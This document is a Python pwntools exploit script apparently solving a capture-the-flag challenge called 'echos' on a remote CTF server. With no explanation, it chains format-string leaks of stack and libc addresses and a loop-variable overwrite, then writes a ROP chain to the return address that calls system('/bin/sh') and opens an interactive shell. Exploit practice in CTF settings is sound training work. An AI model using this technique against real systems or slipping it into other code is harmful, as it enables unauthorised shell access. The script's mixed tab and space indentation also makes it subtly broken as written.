#!/usr/bin/python

from pwn import *

#io = process("./echos")
io = remote("chal.duc.tf", 30001)
elf = ELF("./echos")

context.clear(arch="amd64")

puts_offset = 0x64e80
system_offset = 0x4f440
_bin_sh_offset = 0x1b3e9a
pr_offset = 0x8f3
ret_offset = 0x666


def leak_address():
  '''Leak some addresses from the stack'''
	io.sendline("%16$p %23$p")
	address = io.recvline().strip().split()
	stack, leaked_address = int(address[0], 16), int(address[1], 16)
	return (stack, leaked_address)


def leak_libc_address(base_address):
  '''Leak libc address and get the offset'''
	printf_got = base_address + elf.got["printf"]
	exploit = " %9$s "
	exploit += "A"*2
	exploit += p64(printf_got)
	io.sendline(exploit)
	address = u64(io.recv().split()[0].ljust(8, "\x00")) #upack the leaked address from little-endian
	libc_base = address - puts_offset
	return libc_base


def loop_var(var, value):
  '''overwrite the loop variable for more inputs'''
	log.info("Overwriting the Loop Variable: " + hex(value))
	exploit = fmtstr_payload(8, {var:value}, write_size="short")
	io.sendline(exploit)
	end = exploit.find(exploit[-1:])
	io.recvuntil(exploit[end-2:end])


def final_exploit(address, *args):
  '''Over write the return address '''
	for i in range(len(args)):
		log.info("Writing to the return Address: " + hex(args[i]))
		exploit = fmtstr_payload(8, {address + (8*i): args[i]}, write_size="short")
		io.sendline(exploit)
		end = exploit.find(exploit[-1:])
		io.recvuntil(exploit[end-2:end])

address = leak_address()
stack, leaked_address = address[0], address[1]

base_address = (leaked_address - elf.sym["main"])
return_address = (stack - 216)
var = (return_address - 92)

libc_base = leak_libc_address(base_address)

system = system_offset + libc_base
_bin_sh = _bin_sh_offset + libc_base
ret = ret_offset + base_address
pr = pr_offset + base_address

loop_var(var, 0xfffffff6)
final_exploit(return_address, ret, pr, _bin_sh, system)
loop_var(var, 0x4)
io.interactive()
